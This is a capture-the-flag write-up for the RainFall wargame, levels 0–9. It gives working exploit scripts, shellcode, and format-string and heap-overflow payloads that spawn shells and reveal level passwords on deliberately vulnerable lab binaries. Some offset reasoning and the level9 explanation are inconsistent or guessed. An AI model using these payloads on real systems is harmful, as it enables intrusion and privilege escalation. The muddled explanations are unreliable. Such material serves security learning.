LEVEL_0:
# 📚 Exploiting `level0`
> scp -P 4242 level@192.168.0.111:/home/user/level/level ./level : copy binary file to host machine 
```
./level0 423
$ cd ..
$ cd level1 
$ cat .pass 
```
```
1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
```

LEVEL_1:
# 📚 Exploiting `level1` – Exploit the overflow to get a shell.
    - get the system addr:
        level1@RainFall:~$ gdb ./level1
        (gdb) disas system
        Dump of assembler code for function system@plt:
        0x08048360 <+0>:     jmp    *0x80497a0
        0x08048366 <+6>:     push   $0x10
        0x0804836b <+11>:    jmp    0x8048330
        End of assembler dump.
        
    - get the /bin/sh addr : 
        level1@RainFall:~$ gdb ./level1
        (gdb) b main
        Breakpoint 1 at 0x8048483
        (gdb) run
        Starting program: /home/user/level1/level1

        Breakpoint 1, 0x08048483 in main ()
        (gdb) info proc map
        process 4123
        Mapped address spaces:

                Start Addr   End Addr       Size     Offset objfile
                0x8048000  0x8049000     0x1000        0x0 /home/user/level1/level1
                0x8049000  0x804a000     0x1000        0x0 /home/user/level1/level1
                0xb7e2b000 0xb7e2c000     0x1000        0x0
                0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
                0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
                0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
                0xb7fd2000 0xb7fd5000     0x3000        0x0
                0xb7fdb000 0xb7fdd000     0x2000        0x0
                0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
                0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
                0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
                0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
                0xbffdf000 0xc0000000    0x21000        0x0 [stack]
        (gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
        0xb7f8cc58
        1 pattern found.
        (gdb) x/s 0xb7f8cc58
        0xb7f8cc58:      "/bin/sh"
    

- system()	        ->    0x08048360	-> \x60\x83\x04\x08
- Fake Return Address	->    "AAAA"
- "/bin/sh" string    ->    0xb7f8cc58 ->	\x58\xcc\xf8\xb7

> (python -c 'print("A"*76 + "\x60\x83\x04\x08" + "AAAA" + "\x58\xcc\xf8\xb7")' ; cat ) | ./level1

whoami</br>
level2</br>
cd ..</br>
cd level2</br>
cat .pass</br>
```
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

LEVEL_2:
# 📚 Exploiting `level2` – Exploit the overflow to get a shell.

Since return-to-stack is blocked, we execute shellcode from the heap using strdup().

Exploit Strategy:</br>

Inject shellcode into local_50 buffer:
  - 2.strdup(local_50) copies this shellcode to heap at a predictable address (found via GDB).
  - 3.Overflow RET to point to the heap address returned by strdup().
  - 4.When p() returns → EIP = heap → shellcode executes → /bin/sh spawns.

Why This Works?</br>

NX disabled → heap is executable(Check only blocks stack addresses, not heap).</br>
ASLR off → heap address is stable (e.g., 0x0804a008).
strdup() gives us a writable+executable space for shellcode.

Find heap address after strdup() using GDB:
```
break *0x0804853d
run < <(python exploit.py)
info registers
```
Craft payload:

Shellcode: 25-byte Linux x86 execve("/bin/sh").

Padding to 76 bytes.</br>
Overwrite EBP (4 bytes).</br>
Overwrite RET with heap address.
```
from struct import pack
shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    "\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
)
heap_addr = 0x0804a008
payload  = shellcode
payload += "A" * (76 - len(shellcode))
payload += "B" * 4
payload += pack("<I", heap_addr)
print(payload)
```

> (python exploit.py; cat) | ./level2

LEVEL_3:
# 📚 Exploiting `level3` – Format String Vulnerability to Overwrite Global Variable

## 🔍 Challenge Summary

The target is a vulnerable binary named `level3` from the RainFall wargame on Linux. Our goal is to:

- Exploit a **format string vulnerability** in `printf()`
- Overwrite a global variable `m` with the value `0x40`
- Satisfy the condition `if (m == 0x40)` to execute `system("/bin/sh")`


## 🔐 Binary Protections

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3


$ cat /proc/sys/kernel/randomize_va_space
0
```
```
void v(void) {
  char local_20c[520];
  fgets(local_20c, 0x200, stdin);
  printf(local_20c);  // ⚠️ format string vulnerability
  if (m == 0x40) {
    fwrite("Wait what?!\n",1,0xc,stdout);
    system("/bin/sh");
  }
}
```
 ## Exploitation Strategy

    Leak stack contents to determine the correct format string offset
    Use %n to write 0x40 to the address of the global variable m
    Trigger the condition and gain a shell

##  Step 1: Find the Address of m

```
(gdb) p &m
$1 = (int *) 0x0804988c
```
## Step 2: Discover Format String Offset

```
for i in $(seq 1 40); do
  python -c "print('AAAA' + ' %%%d\$x' % $i)" | ./level3
done
```
Look for 41414141 in the output. appears at %4$x, that means the offset is 7.
## Step 3: Exploit Script (Python)
```
import struct
import sys

if len(sys.argv) != 2:
    print("Usage: python exploit.py <offset>")
    sys.exit(1)

offset = int(sys.argv[1])

m_addr = struct.pack("<I", 0x0804988c)  # Address of 'm'
target_val = 0x40  # Decimal 64

written = len(m_addr)
padding = target_val - written
if padding < 0:
    padding += 256

fmt = "%%%dx%%%d$n" % (padding, offset)
payload = m_addr + fmt.encode("ascii")

with open("payload.txt", "wb") as f:
    f.write(payload)

print("Wrote payload with offset %d" % offset)

```
## Step 4: Execute the Exploit
```
python exploit.py 4 
(cat payload.txt; cat) | ./level3
Wait what?!
$ whoami
level4
```

LEVEL_4:
# 📚 Exploiting `level4` – Format String Vulnerability to Overwrite Global Variable

## 🔍 Challenge Summary

The target is a vulnerable binary named `level4` from the RainFall wargame on Linux. Our goal is to:

- Exploit a **format string vulnerability** in `printf()`
- Overwrite a global variable `m` with the value `0x1025544`
- Satisfy the condition `if (m == 0x1025544)` to execute ` system("/bin/cat /home/user/level5/.pass")`


## 🔐 Binary Protections

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4

void p(char *param_1)

{
  printf(param_1);
  return;
}

void n(void)
{
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  p(local_20c);
  if (m == 0x1025544) {
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}

```
 ## Exploitation Strategy

    Leak stack contents to determine the correct format string offset
    Use %n to write 0x40 to the address of the global variable m
    Trigger the condition and gain a shell

##  Step 1: Find the Address of m

```
(gdb) p &m
$1 = (int *) 0x08049810
```
## Step 2: Discover Format String Offset

```
for i in $(seq 1 40); do
  python -c "print('AAAA' + ' %%%d\$x' % $i)" | ./level4
done
```
Look for 41414141 in the output. appears at %11$x, that means the offset is 7.
## Step 3: Exploit Script (Python)
```
import struct
import sys

if len(sys.argv) != 2:
    print("Usage: python exploit.py <offset>")
    sys.exit(1)

offset = int(sys.argv[1])

m_addr = struct.pack("<I", 0x08049810)
target_val = 0x1025544
written = len(m_addr)

padding = target_val - written
if padding < 0:
    padding += 256

fmt = "%%%dx%%%d$n" % (padding, offset)
payload = m_addr + fmt.encode("ascii")

with open("payload.txt", "wb") as f:
    f.write(payload)

print("Wrote payload with offset %d" % offset)


```
## Step 4: Execute the Exploit

> python exploit.py 11 </br>
> (cat payload.txt; cat) | ./level4
```
b7ff26b0
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
LEVEL_5:
# 📚 Exploiting `level5` – Format String Vulnerability
```
$ ./level5
test
test
$
```
```
void o(void)
{
  system("/bin/sh");
                    // WARNING: Subroutine does not return
  _exit(1);
}

void n(void)
{
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  printf(local_20c);
                    // WARNING: Subroutine does not return
  exit(1);
}

void main(void)
{
  n();
  return;
}

```
## What happens?

The program reads input via fgets() into a large buffer (local_20c).</br>
Then it calls printf(local_20c); — format string vulnerability!</br>
Finally, it calls exit(1);

## Goal
Use the format string vulnerability in printf(local_20c) to overwrite a GOT entry so when exit(1) is called, it actually calls o() instead of the normal exit().
## Step 1: Identify the GOT entry for exit
```
$ readelf -r ./level5 | grep exit
08049828  00000207 R_386_JUMP_SLOT   00000000   _exit
08049838  00000607 R_386_JUMP_SLOT   00000000   exit

```
So, exit@GOT is at 0x08049838 
## Step 2: Find the address of o()
```
$ gdb ./level5
(gdb) info fucntions
...
0x080484a4  o
0x080484c2  n
0x08048504  main
...

```
so the address of o is 0x080484a4

## Step 3: Exploit with format string

Use the format string vulnerability to write the address of o() into exit@GOT.</br>
When n() calls exit(1), the program actually jumps to o(), spawning a shell.

How to write the address?

    Split o() address into two halves (low 2 bytes and high 2 bytes).
    Write these halves to exit@GOT and exit@GOT + 2 using %hn.
    Use format string to print enough characters for padding.

exploit script using python
```
import struct

ret_addr = 0x08049838
win_addr = 0x080484a4

low = win_addr & 0xffff       # 0x84a4
high = (win_addr >> 16)       # 0x0804

addr1 = struct.pack("<I", ret_addr)
addr2 = struct.pack("<I", ret_addr + 2)
print(addr1, addr2)
offset = 4
written = len(addr1) + len(addr2)  # 2 addresses = 8 bytes

pad1 = low - written
pad2 = high - low
if pad1 < 0:
    pad1 += 0x10000
if pad2 < 0:
    pad2 += 0x10000


fmt = "%%%dx%%%d$hn%%%dx%%%d$hn" % (pad1, offset, pad2, offset + 1)

payload = addr1 + addr2 + fmt.encode()

with open("payload.txt", "wb") as f:
    f.write(payload)
print("Payload written with offset %d" % offset)
```
```
(cat payload.txt; cat) | ./level5
whoami
level6
```

LEVEL_6:
# 📚 Exploiting `level6` – overwrite the function pointer

## ✅ Step 1: Understand what you need to overflow

You're trying to overwrite the function pointer stored in the second malloc'd block (`heap2`), which is written with:

```asm
mov $0x8048468, %edx     ; address of m()
mov 0x18(%esp), %eax     ; heap2
mov %edx, (%eax)         ; *heap2 = m
```

You control the data written into `heap1` via:

```c
strcpy(heap1, argv[1])
```

So:

* `heap1 = malloc(0x40)`
* `heap2 = malloc(0x4)`
* `*heap2 = &m`
* Then `strcpy(heap1, argv[1])`

That means you need to:

* Write 64 bytes (0x40) to fill `heap1`
* Then **4 more bytes** to overwrite the function pointer in `heap2`

---

## ✅ Step 2: Confirm address of `n()` function

From your GDB output:

```asm
Dump of assembler code for function n:
0x08048454 <+0>: ...
```

So, address of `n()` is:

```
0x08048454
```

---

## ✅ Step 3: Craft the payload

In Python:

```bash
python -c 'print("A"*64 + "\x54\x84\x04\x08")'
```

---

## ✅ Step 4: Run the program with the payload

**Important:** the program is calling `strcpy(argv[1])`, not reading from stdin — so you must pass the payload as an argument:

```bash
level6@RainFall:~$ ./level6 $(python -c 'print("A"*64 + "\x54\x84\x04\x08")')
Nope
level6@RainFall:~$ ./level6 $(python -c 'print("A"*68 + "\x54\x84\x04\x08")')
Segmentation fault (core dumped)
level6@RainFall:~$ ./level6 $(python -c 'print("A"*72 + "\x54\x84\x04\x08")')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
level6@RainFall:~$ su level7
password: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
level7@RainFall:~$
```

This should cause:

* input overflows `heap1`
* Overwrites the pointer in `heap2` with `0x08048454` (address of `n`)
* When `main()` executes `call *eax`, it will actually call `n()`, which runs `system("/bin/sh")`

---

LEVEL_7:
# 📚 Exploiting `level7` – overwrite the function pointer

# Heap overflow
What's happening in the code

This program appears to take two command-line arguments, stores them in malloced memory, and copies them using strcpy():
```
strcpy((char *)puVar1[1], *(char **)(param_2 + 4));  // argv[1]
strcpy((char *)puVar3[1], *(char **)(param_2 + 8));  // argv[2]
```
Then it reads a secret file into a global variable c:
```
fgets(c, 0x44, __stream);  // Read password into c
puts('~~')
```
The goal is to somehow call the m() function, which prints c, thus leaking the password.
```
printf("%s - %d\n", c, time(0));
```
So the input is directly copied into malloc'd memory, with no length checking. This is a classic heap-based *buffer overflow*.

## How to exploit it
### overwriting the GOT entry for puts(), which the program does definitely call right after reading the password.
After reading the secret into c, main() does:
If you overwrite the GOT slot for puts with the address of m, then:
```
puts("~~");
```
becomes effectively:
```
m("~~", /*garbage*/, /*garbage*/, /*garbage*/, /*garbage*/);
```
## Find the puts@GOT address
```
level7@RainFall:~$ readelf -r ./level7 | grep ' R_386_JUMP_SLOT.*puts'
08049928  00000607 R_386_JUMP_SLOT   00000000   puts
```
## Find the address of m()
```
gdb ./level7
(gdb) p m
$1 = {<text variable, no debug info>} 0x80484f4 <m>

```

## Two-Stage Heap Overflow → GOT Overwrite
### Stage 1: Overflow Chunk B to point puVar3[1] at puts@GOT
```
#!/usr/bin/env python2
import sys
from struct import pack

if len(sys.argv) != 3:
    sys.stderr.write("Usage: %s <pad_len> <got_addr_hex>\n" % sys.argv[0])
    sys.exit(1)

pad_len = int(sys.argv[1])
got_addr = int(sys.argv[2], 16)

payload  = b"A" * pad_len
payload += pack("<I", got_addr)
sys.stdout.write(payload)
```
### stage2: Overflow Chunk D to write m() into puts@GOT
```
#!/usr/bin/env python2
import sys
from struct import pack

m_addr = 0x080484f4
sys.stdout.write(pack("<I", m_addr) + "\x00")
```
### We’ll then make a simple bash loop to try pad values from 8 up to, say, 20.
```
for pad in $(seq 8 20); do
  echo "=== Trying pad = $pad ==="
  ./level7 "$(./stage1.py $pad 0x08049928)" "$(./stage2.py)"
  echo
done
```
after executing it:
=== Trying pad = 8 ===
~~

=== Trying pad = 9 ===
~~
...

=== Trying pad = 18 ===
Segmentation fault (core dumped)

=== Trying pad = 19 ===
Segmentation fault (core dumped)

=== Trying pad = 20 ===
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1754601545

LEVEL_8:
# 📚 Exploiting `level8` 

```
int		main(void)
{
	char	buffer[128];
	
	while (1)
	{
		printf("%p, %p\n", auth, service);
		if (fgets(buffer, 128, stdin) == 0)
			break;
		if (strncmp(buffer, "auth ", 5) == 0)
		{
			auth = malloc(4);
			auth[0] = 0;
			if (strlen(buffer + 5) <= 30)
				strcpy(auth, buffer + 5);
		}
		if (strncmp(buffer, "reset", 5) == 0)
			free(auth);
		if (strncmp(buffer, "service", 6) == 0)
			service = strdup(buffer + 7);
		if (strncmp(buffer, "login", 5) == 0)
		{
			if (auth[32] != 0)
				system("/bin/sh");
			else
				fwrite("Password:\n", 10, 1, stdout);
		}
	}
}
python - <<PY > /tmp/exploit
from struct import pack
OFF = 80            
system = 0xb7e6b060
ret_after_system = 0x41414141   # junk or address of exit()
binsh = 0xb7f8cc58

payload = b"A"*OFF
payload += pack("<I", system)
payload += pack("<I", ret_after_system)
payload += pack("<I", binsh)
payload += b"\n"
open("/tmp/exploit","wb").write(payload)
print("wrote /tmp/exploit, len=", len(payload))
PY


#!/usr/bin/env python3
payload = b"auth AAAAAAAAAAAAAAAAAAAAAAAAAAAXXXX\n"
payload += b"login\n"
open("/tmp/exploit", "wb").write(payload)
print("wrote /tmp/exploit, len=", len(payload))

level8@RainFall:~$ ./level8 < /tmp/exploit
(nil), (nil)
0x804a008, (nil)
0x804a008, 0x804a018
Password:
0x804a008, 0x804a018
level8@RainFall:~$ cat /proc/sys/kernel/randomize_va_space
0
level8@RainFall:~$ (echo "auth AAAAAAAAAAAAAAAAAAAAAAAAAAAXXXX"; echo "login") | ./level8
(nil), (nil)
0x804a008, (nil)
Password:
0x804a008, (nil)
level8@RainFall:~$

level8@RainFall:~$ ./level8
(nil), (nil)
auth
(nil), (nil)
auth
0x804a008, (nil)
service0123456789abcdef
0x804a008, 0x804a018
login
$ whoami
level9
$ ^C
$ ^X^Z^Z^C
$ exit
0x804a008, 0x804a018
exit
0x804a008, 0x804a018
^C
level8@RainFall:~$ ./level8
(nil), (nil)
auth
(nil), (nil)
authx
(nil), (nil)
authrr
(nil), (nil)
authuuuu
(nil), (nil)
auth
(nil), (nil)
auth
0x804a008, (nil)
service0123456789
0x804a008, 0x804a018
login
Password:
0x804a008, 0x804a018
kaka
0x804a008, 0x804a018
whoami
0x804a008, 0x804a018
^C
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service
0x804a008, 0x804a018
login
Password:
0x804a008, 0x804a018
^C
level8@RainFall:~$ clear
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service0123456789abcdef
0x804a008, 0x804a018
login
$ whoami
level9
```

LEVEL_9:
# 📚 Exploiting level9
-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9 </br>
The level9 binary is a C++ program that runs with privileges for bonus0, where a class N with a vtable (for virtual functions like operator+ and operator-).
The program takes a command-line argument (argv[1]) and processes it through a vulnerable function.

Main Function :
```
  void main(int param_1, int param_2) {
    N *this;
    N *this_00;
    if (param_1 < 2) {
      _exit(1);  // Exit if no argv[1]
    }
    this = (N *)operator_new(0x6c);  // Allocate first N object (108 bytes)
    N::N(this, 5);  // Initialize with value 5
    this_00 = (N *)operator_new(0x6c);  // Allocate second N object
    N::N(this_00, 6);  // Initialize with value 6
    N::setAnnotation(this, *(char **)(param_2 + 4));  // Copy argv[1]
    (*(code *)**(undefined4 **)this_00)(this_00, this);  // Call vtable function
    return;
  }
```
N Constructor :
```
  void __thiscall N::N(N *this, int param_1) {
    *(undefined ***)this = &PTR_operator__08048848;  // Set vtable
    *(int *)(this + 0x68) = param_1;  // Set value at offset 0x68
    return;
  }
```
setAnnotation:
```
  void __thiscall N::setAnnotation(N *this, char *param_1) {
    size_t __n = strlen(param_1);
    memcpy(this + 4, param_1, __n);  // Vulnerable copy
    return;
  }
```

Vtable Functions:
```
cint __thiscall N::operator+(N *this, N *param_1) {
  return *(int *)(param_1 + 0x68) + *(int *)(this + 0x68);
}
int __thiscall N::operator-(N *this, N *param_1) {
```

Behavior:
  - Allocates two N objects of size 0x6c (108 bytes) on the heap.
  - Initializes this with value 5, this_00 with value 6, and both with vtable at 0x08048848.
  - Copies argv[1] into this + 4 using memcpy without bounds checking.
  - Calls a function from this_00’s vtable, passing this_00 and this.

## Vulnerability
The memcpy in setAnnotation copies argv[1] to this + 4 with length strlen(argv[1]), without checking if it fits within the first object’s 108 - 4 = 104 bytes of available space.
  - A long argv[1] overflows into the second object (this_00), starting at its heap metadata (~0x804a078).
  - Can overwrite this_00’s vtable pointer (~0x804a080), controlling the function called by (*(code *)this_00->vtable)(this_00, this).
```
Based on GDB and typical heap allocation :
(gdb) b *0x08048617
Breakpoint 1 at 0x8048617
(gdb) b *0x08048639
Breakpoint 2 at 0x8048639
(gdb) run TEST
Starting program: /home/user/level9/level9 TEST

Breakpoint 1, 0x08048617 in main ()
(gdb) si
0x08048530 in operator new ()
(gdb) finish
Run till exit from #0  0x08048530 in operator new ()
0x0804861c in main ()
(gdb) info registers eax
eax            0x804a008        134520840
(gdb) continue
Continuing.

Breakpoint 2, 0x08048639 in main ()
(gdb) si
0x08048530 in operator new ()
(gdb) finish
Run till exit from #0  0x08048530 in operator new ()
0x0804863e in main ()
(gdb) info registers
eax            0x804a078        134520952
ecx            0x20f21  134945
edx            0xb7eec440       -1209088960
ebx            0x804a008        134520840
esp            0xbffff700       0xbffff700
ebp            0xbffff728       0xbffff728
esi            0x0      0
edi            0x0      0
eip            0x804863e        0x804863e <main+74>
eflags         0x200286 [ PF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) set $A = 0x804a008
(gdb) set $B = 0x804a078
(gdb) p/d $B - ($A + 4)
$1 = 108
```
First Object (this):
```
  Starts at ~0x804a008 (heap chunk with metadata).
  Layout:
  0x804a008: [prev_size]
  0x804a00c: [size]
  0x804a010: [vtable = 0x08048848]
  0x804a014: [setAnnotation data]
  ...
  0x804a078: [value = 5]
```
Second Object (this_00):
```
  Starts at ~0x804a078 (0x804a010 + 0x6c).
  Layout:
  text0x804a078: [prev_size]
  0x804a07c: [size]
  0x804a080: [vtable = 0x08048848]
  ...
  0x804a0e4: [value = 6]
```

Key Offsets (from setAnnotation start at 0x804a014):
```
To this_00 start (0x804a078): 0x804a078 - 0x804a014 = 100 bytes.
To this_00->vtable (0x804a080): 108 bytes.
To this_00->vtable + 4 (0x804a084): 112 bytes.
```

Use setAnnotation’s memcpy to overwrite the vtable pointer at 0x804a080.</br>
Set it to point to a heap address (0x0804a00c) that contains the address of system (0xb7d86060).
Place "/bin/sh" nearby (0x804a084) to serve as the argument to system.

### Payload Construction

Total Length: 4 + 104 + 4 + 8 = 120 bytes (ensures memcpy copies all data, as strlen stops at null bytes).

Components:
```
Address of system : 0xb7d86060.
"\xb7\xd8\x60\x60" (big-endian, incorrect).
"\x60\x60\xd8\xb7" (little-endian, correct for x86).
Written to 0x804a014 (start of setAnnotation).

+
NOPS : "\x90" * 104:
104 NOP bytes (0x90, no operation).
Fills from 0x804a018 to 0x804a07f, covering the first object and reaching this_00’s metadata.

+
Heap address: 0x0804a00c (heap metadata, likely size field).
Reversed: "\x0c\xa0\x04\x08".
Written to 0x804a080 (vtable pointer of this_00).

+
";/bin/sh":

8 bytes: semicolon (ignored) + "/bin/sh" + null terminator.
Written to 0x804a084 onward.

0x804a014: 0xb7d86060  # system
0x804a018: \x90\x90...  # 104 NOPs
0x804a080: 0x0804a00c  # vtable -> heap metadata
0x804a084: ;/bin/sh
```
The exploit command:

> ./level9 $(python -c 'print "\x60\x60\xd8\xb7" + "\x90" * 104 + "\x0c\xa0\x04\x08" + ";/bin/sh"') 

How the Exploit Works

Step-by-Step Execution:

Allocation:

this allocated at ~0x804a008, this_00 at ~0x804a078.


setAnnotation:

memcpy(this + 4, payload, strlen(payload)) copies 120 bytes to 0x804a014.
Overwrites:

0x804a014: system address (0xb7d86060).
0x804a080: Vtable pointer to 0x0804a00c.
0x804a084: ";/bin/sh".




Vtable Call:

(*(code *)this_00->vtable)(this_00, this).
this_00->vtable (0x804a080) = 0x0804a00c.
*(0x0804a00c) = 0xb7d86060 (from payload at 0x804a014, possibly due to heap alignment or earlier overwrite).
Calls system(this_00, this), where this_00 = 0x804a078.


system Call:

this_00 (0x804a078) is close to ";/bin/sh" at 0x804a084.
system interprets nearby memory as "/bin/sh" (the semicolon is ignored).
Spawns a shell with bonus0 privileges.




Why 0x0804a00c?:

0x0804a00c is the heap chunk’s size field (metadata).
The payload places system (0xb7d86060) at 0x804a014, but the vtable points to 0x0804a00c.
Likely, heap metadata or an earlier overwrite ensures 0x0804a00c points to 0x804a014 (or nearby), containing system.